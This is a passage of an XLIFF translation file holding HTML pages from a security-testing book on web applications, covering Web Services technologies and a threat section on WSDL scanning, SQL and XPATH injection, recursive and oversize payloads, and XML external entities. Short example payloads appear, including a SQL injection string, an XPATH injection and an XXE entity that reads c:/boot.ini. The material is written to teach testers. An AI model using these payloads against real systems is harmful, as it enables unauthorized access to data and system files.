                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>What Are Web Services?</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web Services are the next generation of Web applications.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch10fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Instead of applications that you can develop in any fashion and with any interface, Web Services expose internal data and interfaces to other programs. Just like traditional Application Programming Interfaces (APIs), a Web application could find and use multiple Web Services that are shared between applications and even companies.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch10fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; For more information on Web Services and their associated protocols, see &lt;a class="docLink" target="_blank" href="http://www.w3.org/2002/ws/"&gt;www.w3.org/2002/ws/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As self-describing, self-contained modular pieces of functionality that can be published, located, and invoked across the Internet, Web Services can expose business functionality, data, and services over the Web using</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>automated interfaces. These interfaces allow companies to discover functionality they need at runtime without the need for them to &amp;quot;do it themselves,&amp;quot; or engage in difficult integration of separate systems. Because of its modularity, a Web Service can perform any function from simple requests (for example, returning details about a particular item to purchase) to complicated business processes (such as booking travel reservations).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Four technologies form the foundation of Web Services: eXtensible Markup Language (XML); Simple Object Access Protocol (SOAP); Web Services Description Language (WSDL); and Universal Description, Discovery, and Integration (UDDI) as shown in &lt;a class="docLink" href="#ch10fig01"&gt;Figure 10-1&lt;/a&gt;. Read on to learn more about them.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 10-1. Technologies that participate in Web Services.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>XML</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>XML is a language to describe data.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch10fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; It does this independently of application, protocol, operating system, and programming language and uses a similar tag structure to HTML. The two differ in that HTML defines how elements are displayed, whereas XML defines what those elements contain.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Whereas HTML uses predefined tags, XML allows tags to be defined by the developer of the page. Therefore, virtually any data items, such as name of book, author, and price can be defined, allowing Web pages to function like database records. By providing a common method for identifying data, XML supports business-to-business transactions and has become the format for electronic data interchange and Web Services.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch10fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; For more information about XML, see &lt;a class="docLink" target="_blank" href="http://www.xml.org/"&gt;http://www.xml.org/&lt;/a&gt; and &lt;a class="docLink" target="_blank" href="http://www.w3.org/XML/"&gt;http://www.w3.org/XML/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, the XML description of a book might look like this:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;book isbn="0321194330" price="23.10"&amp;gt;
  &amp;lt;title&amp;gt;How to break software security&amp;lt;/title&amp;gt;
  &amp;lt;authors&amp;gt;
    &amp;lt;author&amp;gt;James A. Whittaker&amp;lt;/author&amp;gt;
    &amp;lt;author&amp;gt;Herbert H. Thompson&amp;lt;/author&amp;gt;
  &amp;lt;/authors&amp;gt;
  &amp;lt;description&amp;gt;How to Break Software Security
 describes the general problem of software security
 in a practical perspective from a software tester's
 point of view. It defines prescriptive techniques
 (attacks that testers can use on their own
 software) that are designed to ferret out security
 vulnerabilities in software applications. The
 book's style is easy to read and provides readers
 with the techniques and advice to hunt down
 security bugs and see that they're destroyed before
 the software is released.
  &amp;lt;/description&amp;gt;
&amp;lt;/book&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>SOAP</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SOAP is a way to transport XML from one end point to another. It supports a number of standard transport protocols including Transmission Control Protocol (TCP), HyperText Transfer Protocol (HTTP), and Simple Mail Transport Protocol (SMTP), the most popular of which is HTTP. The overall idea of SOAP is to provide an envelope into which an XML message is placed that can be carried by a variety of transport mechanisms. Inside the SOAP envelope are two parts: the header and the body. A SOAP header contains information about the SOAP message, whereas a SOAP body contains the message payload.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The simple SOAP message that follows shows a request made of HTTP that contains both a SOAP header and a SOAP body.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch10fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch10fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; For more information and specifications on SOAP, see &lt;a class="docLink" target="_blank" href="http://www.w3.org/TR/soap/"&gt;www.w3.org/TR/soap/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>POST /checkstock HTTP/1.1
Host: www.store.com
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 279

&amp;lt;?xml version="1.0"?&amp;gt;
&amp;lt;soap:Envelope
xmlns:soap="http://www.w3.org/2001/12/soap-envelope"
soap:encodingStyle="http://www.w3.org/2001/12/soap-
 encoding"&amp;gt;
  &amp;lt;soap:Body
 xmlns:m="http://www.store.com/checkstock"&amp;gt;
    &amp;lt;m:GetQty&amp;gt;
      &amp;lt;m:ItemCode&amp;gt;123123&amp;lt;/m:ItemCode&amp;gt;
    &amp;lt;/m:GetQty&amp;gt;
  &amp;lt;/soap:Body&amp;gt;
&amp;lt;/soap:Envelope&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>WSDL</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>WSDL&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch10fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; is a document written in XML that describes four critical pieces of information:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch10fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; For more information on WSDL, see &lt;a class="docLink" target="_blank" href="http://www.w3.org/TR/wsdl/"&gt;www.w3.org/TR/wsdl/&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Interface information describing all publicly available functions</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Data type information for all message requests and message responses</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Binding information about the transport protocol to be used</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.ul.li.p.text">
          <source>Address information for locating the specified service</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>WSDL is how one service tells another which way to interact with it, where the service resides, what the service can do, and how to invoke it. WSDL is often used in combination with SOAP and XML to provide Web Services over the Internet. It represents a cornerstone of the Web Service architecture because it provides a common language for describing services and a platform for automatically integrating those services.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The following is a simplified fragment of a WSDL document:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;message name="GetQtyRequest"&amp;gt;
   &amp;lt;part name="ItemCode" type="xs:string"/&amp;gt;
&amp;lt;/message&amp;gt;

&amp;lt;message name="GetQtyResponse"&amp;gt;
   &amp;lt;part name="value" type="xs:float"/&amp;gt;
&amp;lt;/message&amp;gt;
&amp;lt;portType name="GetQtyTerms"&amp;gt;
   &amp;lt;operation name="GetQty"&amp;gt;
       &amp;lt;input message="GetQtyRequest"/&amp;gt;
       &amp;lt;output message="GetQtyResponse"/&amp;gt;
   &amp;lt;/operation&amp;gt;
 &amp;lt;/portType&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>UDDI</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A common problem for businesses is how to reach their potential customers and partners with information about their services and products. UDDI attempts to answer this by providing a standard approach that allows companies to advertise both the business (what they offer) and technical aspects (how they offer it) of their services. This is accomplished by providing an information framework that describes and classifies the organization, its services, and the technical details about the interfaces of the Web services. The framework also enables discovery of services or interfaces of a particular type, classification, or function. Think of UDDI as the Yellow Pages of web services. You can find two of the most common UDDI registries at &lt;a class="docLink" target="_blank" href="https://uddi.ibm.com"&gt;https://uddi.ibm.com&lt;/a&gt; and &lt;a class="docLink" target="_blank" href="https://uddi.microsoft.com"&gt;https://uddi.microsoft.com&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec2.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="ch10lev1sec4.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Threats</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>Security and Cryptography Security Software Engineering Internet/Online Mike Andrews James A. Whittaker Addison-Wesley Professional How to Break Web Software: Functional and Security Testing of Web Applications and Web Services</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h3.text">
          <source>Threats</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Web Services provide flexibility and platform-independence along with a loosely coupled architecture for connecting data, systems, and organizations. Properly designed, loosely coupled services can be accessible as separate components of business logic, executed as standalone services, or combined with other services to create a complex application. This, however, opens doors to a number of security concerns.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The section describes the Web Service threat profile. Given the right circumstance, an attacker can translate these threats to exploits and compromise the corresponding infrastructure or the application implemented as a Web Service.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>WSDL Scanning Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>WSDL is used to advertise the interface and address of Web Services. These files are often built automatically using utilities and are designed to expose and describe all the information that's available in a method. Generally having the extension of .WSDL, an attacker can attempt to enumerate WSDL files on the Internet. A simple Google search on &lt;tt&gt;filetype:wsdl amazon&lt;/tt&gt; will list several WSDL files associated with Web services exposed by Amazon (see &lt;a class="docLink" href="#ch10fig02"&gt;Figure 10-2&lt;/a&gt;). A few other Google hack queries include &amp;quot;index of &lt;tt&gt;/wsdl&lt;/tt&gt; and &lt;tt&gt;inurl:wsdl amazon&lt;/tt&gt;.&amp;quot;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 10-2. Searching for WSDL interfaces with Google.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>At first glance, there doesn't seem to be a problem here. After all, companies want people to discover the Web Services they are exposing, right? Well, that's partially correct. As discussed earlier, Web Services are supposed to be identified (and updated) through UDDI. However, some Web Service interfaces discovered directly may contain debugging functions or expose operations that were never meant to be called externally. Because tools automatically create and publish most WSDL files, a developer may not be aware that information is being leaked out about the Web Service.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In addition to inadvertent disclosure of Web Services, the information in a WSDL file may hint at other functionality. Say, for example, that the WSDL describes a &lt;tt&gt;GetStockPrice&lt;/tt&gt; operation; perhaps there is also an unpublished &lt;tt&gt;tradeStock&lt;/tt&gt; function. Unless the application enforces authorization controls for exposed services (and often they don't&amp;mdash;Web Services are generally assumed to be public and default to no protection), an attacker can guess at and further access functionality he is not supposed to.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Parameter Tampering</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Just because an underlying technology changes, we shouldn't throw out all the existing tests we have at our disposal. Attacks like SQL injection are just as effective against Web Services as they are against traditional Web applications. Quite often, Web Services are simply an additional access mechanism to legacy code. Out-of-range parameters, command injection, and directory traversal are not mitigated in any way just because the data is passed through XML. It's all about how the code validates its inputs.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, using XML schemas and namespaces can impose strict data typing (string, integer, and so on), in addition to validation through XML parsers. When Web Services receive data and start to extract sections of it, they have a much better understanding of what correct data should look like. But as said many times in this book, data can be construed in different ways based on its environment. An XML parser may think that a string containing &lt;tt&gt;' or 1=1 --&lt;/tt&gt; is perfectly fine&amp;mdash;a string&amp;mdash;although it has a different meaning when passed to a database.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As with any application, Web Services must validate their inputs before they are used. Leveraging the strong typing of XML does help, but the application must be careful not to blindly use data and trust that it has been validated elsewhere.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>XPATH Injection Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>XPATH is a language for querying XML documents, much like SQL is used for querying a database. Instead of selecting rows and columns for tables, XPATH uses expressions to select nodes and node-sets in an XML document. For example:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;books&amp;gt;
  &amp;lt;book isbn="0099419785"&amp;gt;
    &amp;lt;title&amp;gt;To Kill a Mockingbird&amp;lt;/title&amp;gt;
    &amp;lt;author&amp;gt;Harper Lee&amp;lt;/author&amp;gt;
    &amp;lt;publisher&amp;gt;Arrow&amp;lt;/publisher&amp;gt;
  &amp;lt;/book&amp;gt;
  &amp;lt;book isbn="014023750X"&amp;gt;
    &amp;lt;title&amp;gt;The Catcher in the Rye &amp;lt;/title&amp;gt;
    &amp;lt;author&amp;gt;J.D. Salinger &amp;lt;/author&amp;gt;
    &amp;lt;publisher&amp;gt;Penguin Books&amp;lt;/publisher&amp;gt;
  &amp;lt;/book&amp;gt;
  &amp;lt;book isbn="0140292918"&amp;gt;
    &amp;lt;title&amp;gt;Of Mice and Men&amp;lt;/title&amp;gt;
    &amp;lt;author&amp;gt;John Steinbeck &amp;lt;/author&amp;gt;
    &amp;lt;publisher&amp;gt;Penguin Books&amp;lt;/publisher&amp;gt;
  &amp;lt;/book&amp;gt;
&amp;lt;/books&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.caption.h5.text">
          <source>Table 10-1. Selecting Data Using XPATH Expressions</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>XPATH Expression</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Results</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>/</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select from root node</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>//</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select from current node</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>//Book</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select all Book elements</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Book//Author</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select all Author elements that are descendents of the Book element</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>/Book/Author[1]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Select the first Author element that is the child of the Book element</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An XPATH injection attack allows an attacker to inject malicious expressions as part of a valid SOAP request. This can lead to unauthorized data access and sometimes denial of service attacks. Because XPATH is a standard language, these attacks are easy to carry out compared to SQL injection attacks, which you may need to customize depending on the database. In addition, attackers often do not know a database schema, but with XPATH injection, the document is laid out in front of them, and it's easy to deduce the elements, attributes, and values required for a successful attack. An example XPATH injection on the preceding XML could be &lt;tt&gt;/Books/Book [ISBN-1234or 1=1]&lt;/tt&gt;, which dumps all the Book elements in the XML database. Other than the format, there is no difference between SQL injection and XPATH injection.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Recursive Payload Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>XML uses nesting to represent complex relationships among elements. When an element appears within another element, the inner element is termed as &lt;span class="docEmphStrong"&gt;nested&lt;/span&gt;. Nesting elements three or four levels may have advantages for data hiding (an application can much easier skip over information it doesn't need) and may better represent real-world structures. (A university has departments, which teach classes, which students enroll in, who have associated grades, and so on.) However, an attacker can easily create a document that nests 10,000 or 100,000 elements or attributes in an attempt to break the Web Service. These attacks are called &lt;span class="docEmphStrong"&gt;recursive payload attacks&lt;/span&gt;. For example:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;attack elem1="1" elem2="2" elem3="3" elem4="4" ...
 &lt;span class="docEmphasis"&gt;(continues...)&lt;/span&gt;
  &amp;lt;attack ....
    &amp;lt; attack ....
    &lt;span class="docEmphasis"&gt;(continue nesting elements)&lt;/span&gt;
      &amp;lt;attack&amp;gt;attack data&amp;lt;/attack&amp;gt;
    &amp;lt;/attack&amp;gt;
  &amp;lt;/attack&amp;gt;
&amp;lt;/attack&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because most XML-based systems attempt to load a complete document before processing it (using XPATH queries) or walk over elements extracting information, having deeply nested elements can overwhelm the parser that is loading and verifying the document. This is due to the majority of XML parsers using a technique known as a &lt;span class="docEmphStrong"&gt;push-down automaton&lt;/span&gt;. A map of an XML document is created telling the parser what to do when it discovers certain elements. If the document schema allows for nesting, the parser could find itself in a loop when faced with a recursive payload attack; therefore, it must keep track of the data it has encountered and where in the document it was when it encountered an element. A lot of memory can be consumed on a large document, which could slow down the application as it struggles to find memory (and has to page memory out to disk) or crash the machine if it runs out of space.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Oversize Payload Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>XML is verbose by design. Although the intention is for other pieces of software to be able to read and manipulate XML documents, the format is also designed for humans to read and understand it. It's clearly an improvement over proprietary binary file formats, but it's essential for the Web Service and the XML parser to validate the length of XML received before parsing. Otherwise, one of the oldest attacks in the book&amp;mdash;the buffer overflow attack&amp;mdash;rears its head again.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An attacker may exploit a vulnerability in a Web Service by sending overtly large XML files, perhaps in the size of several gigabytes. In some cases, this may be completely acceptable (perhaps the application deals with multimedia data), but the application must have some concept of the size of data it is supposed to handle and deal with it accordingly by reading it piece by piece as needed. Applications that load XML documents into memory before accessing them (for example, DOM-based systems) are especially vulnerable to this attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>External Entity Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>XML provides external entity references that allow data outside the main document to be imported. It does this by declaring an external reference as &lt;tt&gt;&amp;lt;!ENTITY name SYSTEM "URI&amp;gt;&lt;/tt&gt; so that an XML document can reuse existing data without having to make its own copy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>An &lt;span class="docEmphStrong"&gt;external entity attack&lt;/span&gt; refers to a situation where the external reference is not trusted. An attacker could provide malicious data, initiating an unwanted action. An example would be Adobe's Reader that could be tricked into accessing local files or executing JavaScript (&lt;a class="docLink" target="_blank" href="http://shh.thathost.com/secadv/adobexxe/"&gt;http://shh.thathost.com/secadv/adobexxe/&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>&amp;lt;?xml version="1.0" encoding="ISO-8859-1"?&amp;gt;
&amp;lt;!DOCTYPE foo [
  &amp;lt;!ELEMENT foo ANY&amp;gt;
  &amp;lt;!ENTITY xxe SYSTEM "c:/boot.ini"&amp;gt;
]&amp;gt;
&amp;lt;foo&amp;gt;&amp;amp;xxe;&amp;lt;/foo&amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Because the Web Service can have a different network view from that of the attacker (that is, it can be behind a firewall), it may have increased access to internal networks and thus resources.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.text">
          <source>&amp;nbsp;
          &lt;span style="white-space:nowrap"&gt;&lt;a target="_self" href="ch10lev1sec3.html" title="Previous section"&gt;&lt;img border="0" align="absmiddle" src="btn_prev.gif" alt="Previous section" id="btn_prev" /&gt;&lt;/a&gt;&lt;/span&gt;
				
				&amp;nbsp;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.img.alt">
          <source>Next section</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.span.a.title">
          <source>Top</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.text">
          <source>&amp;nbsp;</source>
          <target></target>
        </trans-unit>
      </group>
      <group id="copyrightpg.html" datatype="unknown">
        <trans-unit id="head.title.text">
          <source>Copyright</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.table.tr.td.text">
          <source>&lt;span style="white-space:nowrap"&gt;&amp;nbsp;&lt;/span&gt;
                  &amp;nbsp;
                  &lt;span style="white-space:nowrap"&gt; &amp;nbsp;&amp;nbsp;&lt;/span&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.a.img.alt">
          <source>Next</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.table.tr.td.text">
          <source>&amp;nbsp;
